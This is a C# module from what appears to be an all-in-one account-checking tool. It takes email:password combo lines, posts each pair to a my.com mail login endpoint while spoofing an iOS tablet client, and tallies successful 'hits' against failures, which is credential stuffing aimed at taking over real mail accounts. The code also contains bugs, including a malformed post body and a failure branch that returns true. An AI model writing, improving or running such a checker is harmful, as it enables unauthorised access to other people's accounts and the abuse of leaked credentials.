using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace HydraAIO.Modules
{
    internal class mailaccessmodule
    {
        public static bool checkmail(string combo)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string username = combo.Split(':')[0];
                string password = combo.Split(':')[1];

                string data = "email=" + username + "password=" + password;

                CookieContainer cc = new CookieContainer();
                var request2 = (HttpWebRequest)WebRequest.Create("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=");

                var postdata = Encoding.ASCII.GetBytes(data);
                request2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";


                request2.ContentLength = data.Length;

                using (var stream = request2.GetRequestStream())
                {
                    stream.Write(postdata, 0, data.Length);
                }
                var response = (HttpWebResponse)request2.GetResponse();

                string html = new StreamReader(response.GetResponseStream()).ReadToEnd();

                if (html.Contains("Ok=1"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    return true;
                }
                if (html.Contains("Ok= 1"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    return true;
                }
                else
                {
                    ++Program.bad;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                }
            }
        }
    }
}
